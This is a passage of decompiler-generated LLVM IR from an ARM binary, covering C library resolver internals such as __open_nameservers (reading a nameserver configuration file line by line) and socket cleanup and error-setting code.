  %v3_18104 = mul i32 %v3_180fc, %tmp146
  %v4_18104 = add i32 %v3_18100, %v3_18104
  store i32 %v4_18104, i32* @r0, align 4
  store i32 %tmp146, i32* @r2, align 4
  %v0_18110 = call i32 @memcpy()
  %v0_18114 = load i32, i32* @r8, align 4
  %v1_18114 = add i32 %v0_18114, 36
  %v2_18114 = inttoptr i32 %v1_18114 to i32*
  %v3_18114 = load i32, i32* %v2_18114, align 4
  %v1_18118 = add i32 %v3_18114, 1
  br label %dec_label_pc_1811c

dec_label_pc_1811c:                               ; preds = %dec_label_pc_1809c.dec_label_pc_1811c_crit_edge, %dec_label_pc_180fc
  %v1_1811c = phi i32 [ %v0_18114, %dec_label_pc_180fc ], [ %v1_1811c.pre, %dec_label_pc_1809c.dec_label_pc_1811c_crit_edge ]
  %storemerge5 = phi i32 [ %v1_18118, %dec_label_pc_180fc ], [ 0, %dec_label_pc_1809c.dec_label_pc_1811c_crit_edge ]
  %v2_1811c = add i32 %v1_1811c, 36
  %v3_1811c = inttoptr i32 %v2_1811c to i32*
  store i32 %storemerge5, i32* %v3_1811c, align 4
  br label %dec_label_pc_18120

dec_label_pc_18120:                               ; preds = %dec_label_pc_180d4, %dec_label_pc_18090, %dec_label_pc_1811c
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_1811c ], [ 0, %dec_label_pc_180d4 ], [ %stack_var_-212.2, %dec_label_pc_18090 ]
  %v1_18128 = add i32 %stack_var_-192.0, 1
  %v0_18130 = load i32, i32* @r5, align 4
  %v2_18130 = add i32 %v0_18130, %v5_18000
  store i32 %v2_18130, i32* @r5, align 4
  br label %dec_label_pc_18134

dec_label_pc_18134:                               ; preds = %dec_label_pc_17fd8, %dec_label_pc_18120
  %v0_17ff4 = phi i32 [ %v0_17fc8, %dec_label_pc_17fd8 ], [ %v2_18130, %dec_label_pc_18120 ]
  %stack_var_-212.2 = phi i32 [ 1, %dec_label_pc_17fd8 ], [ %stack_var_-212.1, %dec_label_pc_18120 ]
  %stack_var_-192.0 = phi i32 [ 0, %dec_label_pc_17fd8 ], [ %v1_18128, %dec_label_pc_18120 ]
  %v2_1813c = sub i32 %stack_var_-192.0, %tmp155
  %v4_1813c = xor i32 %stack_var_-192.0, %tmp155
  %v5_1813c = xor i32 %v2_1813c, %stack_var_-192.0
  %v6_1813c = and i32 %v5_1813c, %v4_1813c
  %v5_18140 = icmp slt i32 %stack_var_-192.0, %tmp155
  br i1 %v5_18140, label %bb204, label %bb205

bb204:                                            ; preds = %dec_label_pc_18134
  %v7_18140 = load i32, i32* @fp, align 4
  %v8_18140 = sub i32 %v0_17ff4, %v7_18140
  %v10_18140 = xor i32 %v7_18140, %v0_17ff4
  %v11_18140 = xor i32 %v8_18140, %v0_17ff4
  %v12_18140 = and i32 %v11_18140, %v10_18140
  br label %bb205

bb205:                                            ; preds = %dec_label_pc_18134, %bb204
  %v1_18144.in = phi i32 [ %v6_1813c, %dec_label_pc_18134 ], [ %v12_18140, %bb204 ]
  %v0_18144.in = phi i32 [ %v2_1813c, %dec_label_pc_18134 ], [ %v8_18140, %bb204 ]
  %v0_18144 = icmp slt i32 %v0_18144.in, 0
  %v1_18144 = icmp slt i32 %v1_18144.in, 0
  %v2_18144 = xor i1 %v1_18144, %v0_18144
  br i1 %v2_18144, label %dec_label_pc_17fec, label %dec_label_pc_18148

dec_label_pc_18148:                               ; preds = %dec_label_pc_1801c, %bb203, %dec_label_pc_1809c, %dec_label_pc_18068, %bb205
  %v1_1814c = call i32 @__libc_close(i32 %v0_17e2c)
  %v3_18150 = load i32, i32* %stack_var_0, align 4
  %v2_18154 = icmp eq i32 %v3_18150, 0
  br i1 %v2_18154, label %.thread26, label %bb206

bb206:                                            ; preds = %dec_label_pc_18148
  %v1_1815c = load i32, i32* @r7, align 4
  %v3_18158 = inttoptr i32 %v3_18150 to i32*
  store i32 %v1_1815c, i32* %v3_18158, align 4
  br label %bb207

.thread26:                                        ; preds = %dec_label_pc_18148
  br label %bb207

bb207:                                            ; preds = %bb206, %.thread26
  store i32 98660, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_18154, i32 ptrtoint (i32* @global_var_14ed0.1005 to i32))
  %v2_18164 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_18164, i32* @r0, align 4
  store i32 %v2_17bf8, i32* @r4, align 4
  %v0_1816c = call i32 @free()
  store i32 %v2_17bf8, i32* @r0, align 4
  %v1_18184 = call i32 @__pthread_return_void()
  %v1_18194 = call i32 @__pthread_return_0()
  %v0_181a0 = load i32, i32* @r6, align 4
  %v3_181a0 = sdiv i32 %v0_181a0, 256
  %v0_181a4 = load i32, i32* @sl, align 4
  store i32 %v0_181a4, i32* @global_var_32b7c.1290, align 4
  store i32 %v2_17bf8, i32* @r0, align 4
  %v1_181b0 = trunc i32 %v3_181a0 to i8
  store i8 %v1_181b0, i8* @global_var_2c8cd.1293, align 1
  %v1_181b4 = trunc i32 %v0_181a0 to i8
  store i8 %v1_181b4, i8* bitcast (i8** @global_var_2c8cc.1292 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_181c4.1304 to i32), i32* @lr, align 4
  %v1_181c0 = call i32 @__pthread_return_void()
  %v0_1834c.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_1834c

dec_label_pc_181c8:                               ; preds = %dec_label_pc_17e5c, %dec_label_pc_17e7c
  %v0_181c8 = load i32, i32* @sl, align 4
  %v1_181c8 = add i32 %v0_181c8, 1
  %v2_181d0 = srem i32 %v1_181c8, %arg3
  store i32 %v2_181d0, i32* @sl, align 4
  %v2_181d4 = icmp eq i32 %v2_181d0, 0
  br i1 %v2_181d4, label %dec_label_pc_181dc, label %dec_label_pc_18294.backedge

dec_label_pc_181dc:                               ; preds = %dec_label_pc_181c8
  %v1_181e4 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_18298.outer.backedge

dec_label_pc_18298.outer.backedge:                ; preds = %dec_label_pc_181dc, %dec_label_pc_18278, %.thread19
  %stack_var_-204.1.ph.be = phi i32 [ %v7_17f70, %.thread19 ], [ -1, %dec_label_pc_18278 ], [ -1, %dec_label_pc_181dc ]
  %stack_var_-208.5.ph.be = phi i32 [ %stack_var_-208.567, %.thread19 ], [ %v1_18280, %dec_label_pc_18278 ], [ %v1_181e4, %dec_label_pc_181dc ]
  %tmp295 = icmp ult i32 %stack_var_-208.5.ph.be, 3
  br i1 %tmp295, label %dec_label_pc_17c7c.lr.ph, label %dec_label_pc_182b4

dec_label_pc_181f4:                               ; preds = %dec_label_pc_180ec
  %v1_181f4 = inttoptr i32 %v0_180ec to i32*
  %v2_181f4 = load i32, i32* %v1_181f4, align 4
  store i32 %v2_181f4, i32* @r0, align 4
  %v0_181f8 = call i32 @free()
  br label %dec_label_pc_181fc

dec_label_pc_181fc:                               ; preds = %dec_label_pc_17f8c, %dec_label_pc_17ee0, %dec_label_pc_1801c, %dec_label_pc_18010, %dec_label_pc_17ef8, %dec_label_pc_17ec0, %dec_label_pc_181f4
  br i1 %v2_18200, label %dec_label_pc_18208, label %dec_label_pc_18264

dec_label_pc_18208:                               ; preds = %dec_label_pc_181fc
  store i32 %v2_17bf8, i32* @r5, align 4
  store i32 %v2_17bf8, i32* @r0, align 4
  %v1_18220 = call i32 @__pthread_return_void()
  %v1_18230 = call i32 @__pthread_return_0()
  %v2_1823c = load i32, i32* @global_var_32c4c.1298, align 4
  store i32 %v2_17bf8, i32* @r0, align 4
  %v1_1824c = call i32 @__pthread_return_void()
  %v1_18254 = add i32 %v2_1823c, -1
  store i32 %v1_18254, i32* @r4, align 4
  %v5_1825c = icmp slt i32 %v6_1825c, %v1_18254
  br i1 %v5_1825c, label %.thread27, label %dec_label_pc_18264

.thread27:                                        ; preds = %dec_label_pc_18208
  %v7_1825c = add i32 %v6_1825c, 1
  br label %dec_label_pc_18294.backedge

dec_label_pc_18264:                               ; preds = %dec_label_pc_18208, %dec_label_pc_181fc
  %v0_18264 = load i32, i32* @sl, align 4
  %v1_18264 = add i32 %v0_18264, 1
  %v2_1826c = srem i32 %v1_18264, %arg3
  store i32 %v2_1826c, i32* @sl, align 4
  %v2_18270 = icmp eq i32 %v2_1826c, 0
  br i1 %v2_18270, label %dec_label_pc_18278, label %dec_label_pc_18294.backedge

dec_label_pc_18278:                               ; preds = %dec_label_pc_18264
  %v1_18280 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_18298.outer.backedge

dec_label_pc_18294.backedge:                      ; preds = %dec_label_pc_181c8, %dec_label_pc_18264, %.thread27
  %storemerge87 = phi i32 [ %v7_1825c, %.thread27 ], [ -1, %dec_label_pc_18264 ], [ -1, %dec_label_pc_181c8 ]
  %tmp296 = icmp ult i32 %stack_var_-208.567, 3
  br i1 %tmp296, label %dec_label_pc_17c7c.lr.ph.preheader, label %dec_label_pc_182b4

dec_label_pc_17c7c.lr.ph.preheader:               ; preds = %dec_label_pc_17c7c.lr.ph.preheader.lr.ph, %dec_label_pc_18294.backedge
  %stack_var_-216.0261 = phi i32 [ -1, %dec_label_pc_17c7c.lr.ph.preheader.lr.ph ], [ %v0_17e2c, %dec_label_pc_18294.backedge ]
  %stack_var_-208.4260 = phi i32 [ %v0_17c74, %dec_label_pc_17c7c.lr.ph.preheader.lr.ph ], [ %stack_var_-208.567, %dec_label_pc_18294.backedge ]
  %v0_18294259 = phi i32 [ -1, %dec_label_pc_17c7c.lr.ph.preheader.lr.ph ], [ %storemerge87, %dec_label_pc_18294.backedge ]
  br label %dec_label_pc_17c7c.lr.ph

dec_label_pc_17c7c.lr.ph:                         ; preds = %dec_label_pc_17c7c.lr.ph.preheader, %dec_label_pc_18298.outer.backedge
  %stack_var_-216.1.ph84 = phi i32 [ %v0_17e2c, %dec_label_pc_18298.outer.backedge ], [ %stack_var_-216.0261, %dec_label_pc_17c7c.lr.ph.preheader ]
  %stack_var_-208.5.ph83 = phi i32 [ %stack_var_-208.5.ph.be, %dec_label_pc_18298.outer.backedge ], [ %stack_var_-208.4260, %dec_label_pc_17c7c.lr.ph.preheader ]
  %v6_1825c = phi i32 [ %stack_var_-204.1.ph.be, %dec_label_pc_18298.outer.backedge ], [ %v0_18294259, %dec_label_pc_17c7c.lr.ph.preheader ]
  %v1_17d24 = icmp slt i32 %v6_1825c, 0
  %v4_17d60 = mul i32 %v6_1825c, 4
  %v5_17d60 = add i32 %v4_17d60, ptrtoint (i32* @global_var_32c2c.1302 to i32)
  %v6_17d60 = inttoptr i32 %v5_17d60 to i32*
  br label %dec_label_pc_17c7c

dec_label_pc_182a8:                               ; preds = %bb195, %.thread8, %dec_label_pc_17bd4, %dec_label_pc_17bc8
  store i32 -1, i32* @sl, align 4
  store i32 -1, i32* @sb, align 4
  br label %dec_label_pc_182b4

dec_label_pc_182b4:                               ; preds = %dec_label_pc_17be4, %dec_label_pc_18294.backedge, %dec_label_pc_18298.outer.backedge, %bb200, %dec_label_pc_17d6c, %dec_label_pc_18298.backedge, %dec_label_pc_182a8
  %stack_var_-216.2 = phi i32 [ -1, %dec_label_pc_182a8 ], [ %v0_17e2c, %dec_label_pc_18298.backedge ], [ %v1_17c84, %dec_label_pc_17d6c ], [ %v1_17c84, %bb200 ], [ %v0_17e2c, %dec_label_pc_18298.outer.backedge ], [ -1, %dec_label_pc_17be4 ], [ %v0_17e2c, %dec_label_pc_18294.backedge ]
  %v0_182b4 = call i32 @__GI___h_errno_location()
  %v2_182bc = inttoptr i32 %v0_182b4 to i32*
  store i32 -1, i32* %v2_182bc, align 4
  %v0_182c0 = load i32, i32* @sb, align 4
  store i32 %v0_182c0, i32* @r6, align 4
  br label %dec_label_pc_182c4

dec_label_pc_182c4:                               ; preds = %dec_label_pc_17fb0, %dec_label_pc_182b4
  %v1_182cc = phi i32 [ %stack_var_-216.2, %dec_label_pc_182b4 ], [ %v0_17e2c, %dec_label_pc_17fb0 ]
  %v7_182c8 = icmp eq i32 %v1_182cc, -1
  br i1 %v7_182c8, label %bb209, label %bb208

bb208:                                            ; preds = %dec_label_pc_182c4
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_182c4, %bb208
  store i32 99028, i32* @lr, align 4
  %v1_182d0 = xor i1 %v7_182c8, true
  call void @__pseudo_cond_branch(i1 %v1_182d0, i32 ptrtoint (i32* @global_var_11ce8.1295 to i32))
  %v2_182d4 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_182d4, i32* @r0, align 4
  %v0_182d8 = call i32 @free()
  %v0_182dc = load i32, i32* @r7, align 4
  store i32 %v0_182dc, i32* @r0, align 4
  %v0_182e0 = call i32 @free()
  %v0_182e4 = load i32, i32* @sl, align 4
  %v7_182e4 = icmp eq i32 %v0_182e4, -1
  br i1 %v7_182e4, label %bb210, label %dec_label_pc_182f0

bb210:                                            ; preds = %bb209
  br label %dec_label_pc_1834c

dec_label_pc_182f0:                               ; preds = %bb209
  %v2_182f0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_182f0, i32* @r0, align 4
  %v1_18308 = call i32 @__pthread_return_void()
  %v1_18318 = call i32 @__pthread_return_0()
  %v0_18324 = load i32, i32* @r6, align 4
  %v3_18324 = sdiv i32 %v0_18324, 256
  %v0_18328 = load i32, i32* @sl, align 4
  store i32 %v0_18328, i32* @global_var_32b7c.1290, align 4
  store i32 %v2_182f0, i32* @r0, align 4
  %v1_18334 = trunc i32 %v3_18324 to i8
  store i8 %v1_18334, i8* @global_var_2c8cd.1293, align 1
  %v1_18338 = trunc i32 %v0_18324 to i8
  store i8 %v1_18338, i8* bitcast (i8** @global_var_2c8cc.1292 to i8*), align 4
  store i32 99144, i32* @lr, align 4
  %v1_18344 = call i32 @__pthread_return_void()
  br label %dec_label_pc_1834c

dec_label_pc_1834c:                               ; preds = %bb210, %bb207, %dec_label_pc_182f0
  %v0_1834c = phi i32 [ %v0_182e4, %bb210 ], [ %v0_1834c.pre, %bb207 ], [ -1, %dec_label_pc_182f0 ]
  store i32 %v3_17b80, i32* @r4, align 4
  store i32 %v6_17b80, i32* @r5, align 4
  store i32 %v9_17b80, i32* @r6, align 4
  store i32 %v12_17b80, i32* @r7, align 4
  store i32 %v15_17b80, i32* @r8, align 4
  store i32 %v18_17b80, i32* @sb, align 4
  store i32 %v21_17b80, i32* @sl, align 4
  ret i32 %v0_1834c

; uselistorder directives
  uselistorder i32 %v0_18324, { 1, 0 }
  uselistorder i32 %v0_182e4, { 1, 0 }
  uselistorder i1 %v7_182c8, { 1, 0 }
  uselistorder i32 %v6_1825c, { 2, 6, 3, 4, 1, 5, 0 }
  uselistorder i32 %stack_var_-208.5.ph.be, { 1, 0 }
  uselistorder i32 %v0_181a0, { 1, 0 }
  uselistorder i32 %stack_var_-192.0, { 6, 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-212.2, { 1, 0 }
  uselistorder i32 %v0_17ff4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_180ec, { 0, 2, 1, 3 }
  uselistorder i32 %v1_180ac, { 1, 0 }
  uselistorder i32 %v0_17fcc, { 1, 0 }
  uselistorder i32 %v0_17fd0, { 1, 0 }
  uselistorder i32 %v6_17ed0, { 1, 0 }
  uselistorder i32 %v0_17e2c, { 5, 0, 1, 2, 3, 4, 6, 8, 7, 10, 9, 12, 13, 11 }
  uselistorder i32 %v1_17d98, { 1, 0 }
  uselistorder i32 %v2_17d38, { 1, 0 }
  uselistorder i32 %v1_17cb0, { 1, 2, 0 }
  uselistorder i1 %v7_17c80, { 1, 0 }
  uselistorder i32 %stack_var_-208.567, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 %v1_17c84, { 1, 2, 0 }
  uselistorder i32 %v0_17c74, { 1, 0 }
  uselistorder i32 %v2_17bf8, { 6, 7, 8, 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-236, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8* %stack_var_-188, { 4, 3, 1, 0, 2 }
  uselistorder i8* %stack_var_-100, { 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp155, { 2, 0, 4, 1, 3 }
  uselistorder i32 %tmp146, { 1, 0, 2 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_close, { 14, 15, 23, 22, 21, 20, 19, 18, 17, 16, 13, 12, 11, 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32*, i32, i32)* @__libc_send, { 6, 5, 0, 1, 2, 3, 4, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 101, { 5, 1, 2, 3, 0, 4, 6 }
  uselistorder i32 (i32, %sockaddr*, i32)* @__libc_connect, { 3, 0, 1, 2, 5, 4, 6 }
  uselistorder i32 ()* @socket, { 2, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0, 1 }
  uselistorder i32 (i32)* @inet_addr, { 3, 5, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 1, 0, 3 }
  uselistorder i8* @global_var_2c8cd.1293, { 2, 1, 0 }
  uselistorder i32 512, { 3, 8, 2, 9, 1, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 2, 4, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_1834c, { 2, 0, 1 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_182c4, { 1, 0 }
  uselistorder label %dec_label_pc_182b4, { 6, 1, 2, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_182a8, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_17c7c.lr.ph.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_18294.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_181fc, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_18298.outer.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_181c8, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %dec_label_pc_18148, { 4, 2, 1, 3, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %dec_label_pc_18134, { 1, 0 }
  uselistorder label %dec_label_pc_18120, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1811c, { 1, 0 }
  uselistorder label %dec_label_pc_18084, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17fc0, { 1, 0 }
  uselistorder label %dec_label_pc_17fb0, { 1, 0 }
  uselistorder label %dec_label_pc_18298.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_17e18, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_17d6c, { 2, 0, 1 }
  uselistorder label %bb200, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_18358:
  %v0_18358 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18358, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_18358
  %v5_18358 = mul i32 %arg2, 256
  %v6_18358 = and i32 %v5_18358, %arg1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_18358, %bb
  %v10_18388 = phi i32 [ %arg1, %dec_label_pc_18358 ], [ %v6_18358, %bb ]
  ret i32 %v10_18388

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__open_nameservers(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1838c = load i32, i32* @r4, align 4
  store i32 %v3_1838c, i32* %stack_var_-28, align 4
  %v6_1838c = load i32, i32* @r5, align 4
  %v9_1838c = load i32, i32* @r6, align 4
  %v12_1838c = load i32, i32* @r7, align 4
  %v15_1838c = load i32, i32* @r8, align 4
  %v18_1838c = load i32, i32* @sl, align 4
  %v2_18390 = ptrtoint i32* %stack_var_-192 to i32
  %v2_18394 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_18394, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_2c8d0.1128 to i32), i32* %r2.global-to-local, align 4
  %v1_183a8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2c8d0.1128 to i32), i32* %r0.global-to-local, align 4
  store i32 99260, i32* @lr, align 4
  %v1_183b8 = call i32 @__pthread_return_0()
  store i32 %v1_183b8, i32* %r0.global-to-local, align 4
  %v2_183c0 = load i32, i32* @global_var_32c48.1133, align 4
  %v5_183c8 = icmp sgt i32 %v2_183c0, 0
  br i1 %v5_183c8, label %dec_label_pc_18604, label %dec_label_pc_183cc

dec_label_pc_183cc:                               ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_24268.1311 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_2427c.1313 to i32), i32* @r1, align 4
  %v3_183d4 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_24268.1311 to i32), i32 ptrtoint (i32* @global_var_2427c.1313 to i32))
  store i32 %v3_183d4, i32* %r0.global-to-local, align 4
  store i32 %v3_183d4, i32* @sl, align 4
  %v2_183d8 = icmp eq i32 %v3_183d4, 0
  br i1 %v2_183d8, label %dec_label_pc_183e0, label %dec_label_pc_185cc.preheader

dec_label_pc_183e0:                               ; preds = %dec_label_pc_183cc
  store i32 ptrtoint ([24 x i8]* @global_var_24280.1315 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_2427c.1313 to i32), i32* @r1, align 4
  %v3_183e8 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_24280.1315 to i32), i32 ptrtoint (i32* @global_var_2427c.1313 to i32))
  store i32 %v3_183e8, i32* %r0.global-to-local, align 4
  store i32 %v3_183e8, i32* @sl, align 4
  %v2_183ec = icmp eq i32 %v3_183e8, 0
  br i1 %v2_183ec, label %dec_label_pc_185f8, label %dec_label_pc_185cc.preheader

dec_label_pc_185cc.preheader:                     ; preds = %dec_label_pc_183cc, %dec_label_pc_183e0
  %v0_185d426 = phi i32 [ %v3_183d4, %dec_label_pc_183cc ], [ %v3_183e8, %dec_label_pc_183e0 ]
  %v2_18440 = ptrtoint i32* %stack_var_-28 to i32
  %v3_184dc = inttoptr i32 %tmp to i8*
  store i32 %v2_18390, i32* %r0.global-to-local, align 4
  store i32 %v0_185d426, i32* %r2.global-to-local, align 4
  %v3_185d866 = call i32 @fgets(i32 %v2_18390, i32 128, i32 %v0_185d426)
  store i32 %v3_185d866, i32* %r0.global-to-local, align 4
  %v2_185dc68 = icmp eq i32 %v3_185d866, 0
  store i32 %v2_18390, i32* @r4, align 4
  br i1 %v2_185dc68, label %dec_label_pc_185ec, label %dec_label_pc_183fc.preheader.lr.ph

dec_label_pc_183fc.preheader.lr.ph:               ; preds = %dec_label_pc_185cc.preheader
  %v1_183fc11 = bitcast i32* %stack_var_-192 to i8*
  br label %dec_label_pc_183fc.preheader

dec_label_pc_183f8:                               ; preds = %dec_label_pc_18408
  %v1_183f8 = add i32 %v0_183f8, 1
  store i32 %v1_183f8, i32* %r0.global-to-local, align 4
  %v1_183fc = inttoptr i32 %v1_183f8 to i8*
  %v2_183fc = load i8, i8* %v1_183fc, align 1
  %v3_183fc = zext i8 %v2_183fc to i32
  store i32 %v3_183fc, i32* %r2.global-to-local, align 4
  %v2_18400 = icmp eq i8 %v2_183fc, 0
  br i1 %v2_18400, label %dec_label_pc_1841c, label %dec_label_pc_18408

dec_label_pc_18408:                               ; preds = %dec_label_pc_18408.lr.ph, %dec_label_pc_183f8
  %v0_183f8 = phi i32 [ %v2_18390, %dec_label_pc_18408.lr.ph ], [ %v1_183f8, %dec_label_pc_183f8 ]
  %v1_18410 = phi i32 [ %v3_183fc13, %dec_label_pc_18408.lr.ph ], [ %v3_183fc, %dec_label_pc_183f8 ]
  %v3_18410 = mul nuw nsw i32 %v1_18410, 2
  %v4_18410 = add i32 %v3_18410, %v2_1840c.pre
  %v5_18410 = inttoptr i32 %v4_18410 to i8*
  %v6_18410 = load i8, i8* %v5_18410, align 1
  %v1_18414 = and i8 %v6_18410, 32
  %v2_18414 = icmp eq i8 %v1_18414, 0
  br i1 %v2_18414, label %dec_label_pc_1841c, label %dec_label_pc_183f8

dec_label_pc_1841c:                               ; preds = %dec_label_pc_183f8, %dec_label_pc_18408, %dec_label_pc_183fc.preheader
  %v0_184b435 = phi i32 [ %v2_18390, %dec_label_pc_183fc.preheader ], [ %v1_183f8, %dec_label_pc_183f8 ], [ %v0_183f8, %dec_label_pc_18408 ]
  %v0_18430 = phi i32 [ %v3_183fc13, %dec_label_pc_183fc.preheader ], [ %v3_183fc, %dec_label_pc_183f8 ], [ %v1_18410, %dec_label_pc_18408 ]
  %v7_1841c = icmp eq i32 %v0_18430, 10
  br i1 %v7_1841c, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_1841c
  %v3_18420 = icmp eq i32 %v0_18430, 0
  br i1 %v3_18420, label %bb55, label %dec_label_pc_18430

.thread3:                                         ; preds = %dec_label_pc_1841c
  br label %dec_label_pc_185cc.backedge

bb55:                                             ; preds = %bb
  br label %dec_label_pc_185cc.backedge

dec_label_pc_185cc.backedge:                      ; preds = %dec_label_pc_185a8, %dec_label_pc_185c0, %bb55, %dec_label_pc_18540, %.thread3, %dec_label_pc_18430
  %v0_185d4.pre = load i32, i32* @sl, align 4
  store i32 %v2_18390, i32* %r0.global-to-local, align 4
  store i32 %v0_185d4.pre, i32* %r2.global-to-local, align 4
  %v3_185d8 = call i32 @fgets(i32 %v2_18390, i32 128, i32 %v0_185d4.pre)
  store i32 %v3_185d8, i32* %r0.global-to-local, align 4
  %v2_185dc = icmp eq i32 %v3_185d8, 0
  store i32 %v2_18390, i32* @r4, align 4
  br i1 %v2_185dc, label %dec_label_pc_185ec, label %dec_label_pc_183fc.preheader

dec_label_pc_18430:                               ; preds = %bb
  %v7_18430 = icmp eq i32 %v0_18430, 35
  br i1 %v7_18430, label %dec_label_pc_185cc.backedge, label %dec_label_pc_184b4

dec_label_pc_18440:                               ; preds = %bb58
  store i32 %v2_18440, i32* %r2.global-to-local, align 4
  %v4_18444 = mul i32 %storemerge, 4
  %v5_18444 = add i32 %v4_18444, %v2_18440
  %v2_18448 = add i32 %v5_18444, -36
  %v3_18448 = inttoptr i32 %v2_18448 to i32*
  store i32 %v0_18448, i32* %v3_18448, align 4
  %v0_1845415 = load i32, i32* %r0.global-to-local, align 4
  %v1_1845416 = inttoptr i32 %v0_1845415 to i8*
  %v2_1845417 = load i8, i8* %v1_1845416, align 1
  %v3_1845418 = zext i8 %v2_1845417 to i32
  store i32 %v3_1845418, i32* %r2.global-to-local, align 4
  %v2_1845819 = icmp eq i8 %v2_1845417, 0
  br i1 %v2_1845819, label %dec_label_pc_18488.preheader, label %dec_label_pc_18460.lr.ph

dec_label_pc_18460.lr.ph:                         ; preds = %dec_label_pc_18440
  %v2_18464.pre = load i32, i32* @global_var_2c58c, align 4
  br label %dec_label_pc_18460

dec_label_pc_18450:                               ; preds = %dec_label_pc_18474
  %v1_18450 = add i32 %v0_18450, 1
  store i32 %v1_18450, i32* %r0.global-to-local, align 4
  %v1_18454 = inttoptr i32 %v1_18450 to i8*
  %v2_18454 = load i8, i8* %v1_18454, align 1
  %v3_18454 = zext i8 %v2_18454 to i32
  store i32 %v3_18454, i32* %r2.global-to-local, align 4
  %v2_18458 = icmp eq i8 %v2_18454, 0
  br i1 %v2_18458, label %dec_label_pc_18488.preheader, label %dec_label_pc_18460

dec_label_pc_18460:                               ; preds = %dec_label_pc_18460.lr.ph, %dec_label_pc_18450
  %v0_18450 = phi i32 [ %v0_1845415, %dec_label_pc_18460.lr.ph ], [ %v1_18450, %dec_label_pc_18450 ]
  %v0_18474 = phi i32 [ %v3_1845418, %dec_label_pc_18460.lr.ph ], [ %v3_18454, %dec_label_pc_18450 ]
  %v3_18468 = mul nuw nsw i32 %v0_18474, 2
  %v4_18468 = add i32 %v3_18468, %v2_18464.pre
  %v5_18468 = inttoptr i32 %v4_18468 to i8*
  %v6_18468 = load i8, i8* %v5_18468, align 1
  %v1_1846c = and i8 %v6_18468, 32
  %v2_1846c = icmp eq i8 %v1_1846c, 0
  br i1 %v2_1846c, label %dec_label_pc_18474, label %dec_label_pc_18488.preheader

dec_label_pc_18474:                               ; preds = %dec_label_pc_18460
  %v7_18474 = icmp eq i32 %v0_18474, 10
  br i1 %v7_18474, label %dec_label_pc_18488.preheader, label %dec_label_pc_18450

dec_label_pc_18488.preheader:                     ; preds = %dec_label_pc_18474, %dec_label_pc_18460, %dec_label_pc_18450, %dec_label_pc_18440
  %v0_1848820 = phi i32 [ %v0_1845415, %dec_label_pc_18440 ], [ %v0_18450, %dec_label_pc_18474 ], [ %v0_18450, %dec_label_pc_18460 ], [ %v1_18450, %dec_label_pc_18450 ]
  %v1_1848821 = inttoptr i32 %v0_1848820 to i8*
  %v2_1848822 = load i8, i8* %v1_1848821, align 1
  %v3_1848823 = zext i8 %v2_1848822 to i32
  store i32 %v3_1848823, i32* %r2.global-to-local, align 4
  %v2_1848c24 = icmp eq i8 %v2_1848822, 0
  br i1 %v2_1848c24, label %dec_label_pc_184b0, label %dec_label_pc_18494

dec_label_pc_18480:                               ; preds = %dec_label_pc_18494, %dec_label_pc_184a8
  %v3_18484 = inttoptr i32 %v2_18484 to i8*
